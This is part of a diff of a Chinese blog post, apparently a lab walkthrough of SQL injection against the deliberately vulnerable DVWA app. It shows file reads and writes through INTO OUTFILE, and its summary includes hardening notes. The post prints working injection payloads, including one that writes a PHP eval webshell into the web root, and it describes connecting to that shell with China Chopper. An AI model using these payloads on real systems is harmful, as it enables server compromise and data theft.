+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wsolxhgoj30hx01jq2r.jpg" alt="26"></p>
+<p>好吧看了下文件夹的权限，emmmm</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wsorp0rej30hu077t8w.jpg" alt="27"></p>
+<p>好吧，不过我们可以看到tmp这个文件夹什么权限都有再来试下</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wsozyfnfj30hp015mwy.jpg" alt="28"></p>
+<p>这次没有报错了</p>
+<p>回到本地打开文件看下，很好成功的生成了文件，打开文件看也发现里面的内容与我们写进去的一致</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wsp62iosj30hh01uq2q.jpg" alt="29"></p>
+<p>这里要注意的是写入的文件不能是已经存在的文件</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1wspd1wl9j30hl012t8i.jpg" alt="30"></p>
+<p>虽然不抱什么希望，但还是试一下向dvwa上上传文件</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1wspjkqbkj30k203jdfz.jpg" alt="31"></p>
+<p>结果返回了上图中的错误，正常的查询和注入都没问题，结果写文件的时候返回了这个权限登录的问题， emmm…</p>
+<p>这和我在dvwa服务器上登录mysql返回的错误一样</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wsppa5bjj30hx01dq2r.jpg" alt="32"></p>
+<p>这是个什么权限问题了，</p>
+<p>登录dvwa mysql的root用户，查看一下app的权限</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1wspw9hchj30i303hmx4.jpg" alt="34"></p>
+<p>可以看到app用户在dvwa数据库权限还是很高的，其它就只有登录权限了</p>
+<p>然后用dvwa mysql的root用户直接进行读取文件，和上传文件都是没有问题的</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wsq47a4vj30hw032mwz.jpg" alt="35"></p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wsq63zavj30fc01d0sj.jpg" alt="36"></p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wsq7y0ctj30hs01vt8i.jpg" alt="37"></p>
+<p>好吧我们来做点邪恶的事…强制提升一下app这位用户的权限（我觉得实际操作中这样应该很困难…)</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wsqiusnpj30i404kt8r.jpg" alt="38"></p>
+<p>很好现在权限足够高了，我们在重新注入dvwa试下</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wsqr6q4pj30ho05edfx.jpg" alt="39"></p>
+<p>很棒，文件读取已经成功了，再来尝试上传</p>
+<p>执行 <code>1&#39; union &quot;test&quot;,&quot;hahaha&quot; into outfile &#39;/tmp/myfile&#39;#</code> 后，可以看到本地已经有了文件</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1wsqx9oyjj30hr02fglf.jpg" alt="40"></p>
+<p>这样上传的文件会多两个admin，因为前面的1把查询出来的结果admin admin也给写入进去了</p>
+<p>所以改成<code>&#39; union &quot;test&quot;,&quot;lalala&quot; intofile &#39;/tmp/myfile1&#39;#</code> 这样就OK了</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1wsr7j6q8j30hm01z3yb.jpg" alt="41"></p>
+<p>这里为什么要把”test”和”lalala”分开写了，因为这里是union啊要和前面的列数匹配，不然不行（我试了，真的不行，就不截图了…）</p>
+<p>我试了下不用绝对路径去写，发现也能上传成功，只是上传路径就很奇怪了（这应该是mysql默认的路径，下面的文件文件夹所有权都是mysql），如果上传webshell的话是无法执行的吧</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1wsrfcbbuj30hz01xjr8.jpg" alt="42"></p>
+<p>然后找了下正常的网页路径</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1wsrl4f01j30ht0123ya.jpg" alt="43"></p>
+<p>然后尝试下向这里上传文件，发现权限不够…</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wsrrwyalj30hy00fdfl.jpg" alt="44"></p>
+<p>这里的权限是www-data的…为了体验下webshell我们来改权限吧…</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wsrxb7gaj30hv00jdfl.jpg" alt="45"></p>
+<p>随便上传了一个myfile，成功</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wss3dbbmj30hv03jq2w.jpg" alt="46"></p>
+<p>浏览器访问也OK</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1wssck3uaj30mx05pmxe.jpg" alt="47"></p>
+<p>现在我们来构造一个webshell来体验下（因为不会 <del>世界上最好的语言</del> 所以直接从别人的博客那里借鉴的，后面有时间再补习下 <del>世界上最好的语言</del> 吧， 看了下其实就是利用HTTP的get和post来传递命令，eval把其当做 <del>世界上最好的语言</del> 来执行）</p>
+<p><code>&#39; union select &quot;&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;&quot;, &quot;myshell&quot; into outfile &#39;/var/www/html/hack.php&#39;#</code></p>
+<p>上传成功</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wssjeavpj30ht03ot8p.jpg" alt="48"></p>
+<p>我们来利用这个webshell来查看下我们的flag文件</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wssp48v3j30nc08xjrq.jpg" alt="49"></p>
+<p>结果没有显现出来…作为菜鸡的我蒙蔽了，果然不掌握世界上最好的语言没法混啊…</p>
+<p>好的，仔细看了下_GET前面少了一个$，修改hack.php后成功返回了flag</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wssvjybnj30ju06lq3c.jpg" alt="50"></p>
+<p>然后再上传个小马玩下</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1wst23a3fj30hy00wwea.jpg" alt="51"></p>
+<p>接下来当然是上菜刀</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wst8iesrj30eb08pdfr.jpg" alt="52"></p>
+<p>最后成功连上，可以看见文件列表和虚拟终端了，✿✿ヽ(°▽°)ノ✿</p>
+<p>好的这次站在上帝视角的上传读取文件成功完成，撒花✿✿ヽ(°▽°)ノ✿</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li><p>重要的参数</p>
+<p>secure_file_priv参数很重要，mysql5.7及以后都默认为NULL了，如果不改为空都上传下载都无法正常使用</p>
+<blockquote>
+<p>其中当参数 secure_file_priv 为空时，对导入导出无限制<br>当值为一个指定的目录时，只能向指定的目录导入导出<br>当值被设置为NULL时，禁止导入导出功能</p>
+</blockquote>
+<p>max_allowed_packet 这个参数限制了上传下载文件的大小</p>
 </li>
-<li><p>mysql中if的用法</p>
-<p>if(expr1,expr2,expr3) 这里expr1为判断条件，如果expr1为真则返回expr2否则返回expr3</p>
+<li><p>重要的权限</p>
+<p>读取文件的文件要有当前数据库用户的读取权限，才能正常读取</p>
+<p>上传文件的上传路径必须要有数据库用户的写入权限，才能正常上传文件</p>
+<p>数据库分配用户的权限，如上面实践所得dvwa的app用户没有权限可是害苦了我（以前说设置数据库用户权限没什么用的我，再次被打脸）</p>
+<p>文件和文件夹的权限，mysql用户要是没有读写权的话也没法正常读取导入文件</p>
 </li>
-<li><p>使用基于时间的注入，对方可能会对查询为空的返回随机加入sleep()，方法可能失效</p>
+<li><p>上传文件不仅要知道服务器的一个绝对路径(上面不带绝对路径的文件虽然上传成功，但却无法访问，因为那个路径不可访问)，而且那个路径下mysql要有权限写入文件</p>
+</li>
+<li><p>作为网站安全的角度出发，secure_file_priv参数很重要，如果需要导入导出也要设好路径，特别是mysql5.7及以后都默认为NULL安全考虑的就很好了，其次数据库用户权限的设置真的很重要，再其次文件和文件夹的权限也要给的合适</p>
+</li>
+</ol>
+<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><ol>
+<li><p>在字符型注入要注意引号，可能是单引号也可能是双引号，所以字符注入的时候要分清是双引号还是单引号，不然会注入失败</p>
+</li>
+<li><p>在盲注的时候通过基于布尔或者基于时间的方法获取了字段的数量，在SQL注入的时候因为直接回显所以没有获取字段数量的操作，但也可以利用order by来获取字段数量</p>
+<p>比如order by 1参照第一列字段进行排序，正常返回就说明字段数量大于等于1，然后可以order by 10 如果不可以，我们就可以采取二分的方法，尝试order by 5</p>
+</li>
+<li><p>secure_file_priv查询了下从MySQL5.7开始默认是NULL，不能直接读取文件了，需要修改权限了</p>
+</li>
+<li><p>因为php中转义函数的原因，文件名的’’会被转义，可以用十六进制或者char(路径ascii)方法</p>
 </li>
 </ol>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
-<li><a href="https://www.freebuf.com/articles/web/120985.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)</a></li>
+<li><a href="https://www.imbajin.com/web%E5%AE%89%E5%85%A8%E4%B9%8BDVWA%E3%81%AESQL%E6%B3%A8%E5%85%A5(%E5%85%AD" target="_blank" rel="noopener">web安全之DVWAのSQL注入(六)</a>/)</li>
+<li><p><a href="http://www.php.cn/mysql-tutorials-401995.html" target="_blank" rel="noopener">mysql5.7导出数据提示–secure-file-priv选项问题的解决方法</a></p>
+</li>
+<li><p><a href="https://www.cnblogs.com/blacksunny/p/8060028.html" target="_blank" rel="noopener">mysql load_file在数据库注入中使用</a></p>
+</li>
+<li><a href="http://www.cnblogs.com/hackxf/p/8975501.html" target="_blank" rel="noopener">sql注入–高权限，load_file读写文件</a></li>
+<li><a href="https://www.jb51.net/article/139858.htm" target="_blank" rel="noopener">Mysql注入中的outfile、dumpfile、load_file函数详解</a></li>
 </ol>
 
         </div>
@@ -629,15 +603,15 @@
           
             <div class="post-nepre half previous">
           
-            <a href="/2019/04/09/SQL Injection3(读取和上传文件文件)/" rel="prev">
+            <a href="/2019/04/12/SQL Injection4(sqlmap)/" rel="prev">
               <div class="background">
-                <img class="lazyload" src="/images/loader/orange.progress-bar-stripe-loader.svg" data-src="https://ws1.sinaimg.cn/large/006tNc79ly1g1wtb7liqhj30rs0ijwkp.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)">
+                <img class="lazyload" src="/images/loader/orange.progress-bar-stripe-loader.svg" data-src="https://ws1.sinaimg.cn/large/006tNc79ly1g1z69vr57qj318g0rswmd.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)">
               </div>
               <span class="label">
               Previous Post</span>
               <div class="info">
                 <h3>
-                SQL Injection3(读取和上传文件文件)</h3>
+                SQL Injection4(sqlmap)</h3>
                 <hr>
               </div>
             </a>
@@ -647,15 +621,15 @@
           
             <div class="post-nepre half next">
           
-            <a href="/2019/04/01/SQL Injection 1（勘误）/" rel="next">
+            <a href="/2019/04/08/SQL Injection2(Blind)/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/images/loader/orange.progress-bar-stripe-loader.svg" data-src="https://ws4.sinaimg.cn/large/006tKfTcly1g1nmxvn1w4j30q40doace.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)">
+                <img class="lazyload" src="/images/loader/orange.progress-bar-stripe-loader.svg" data-src="https://ws2.sinaimg.cn/large/006tNc79ly1g1ullewnlqj30u90l20vd.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                SQL Injection 1（勘误）</h3>
+                SQL Injection2(Blind)</h3>
                 <hr>
               </div>
             </a>
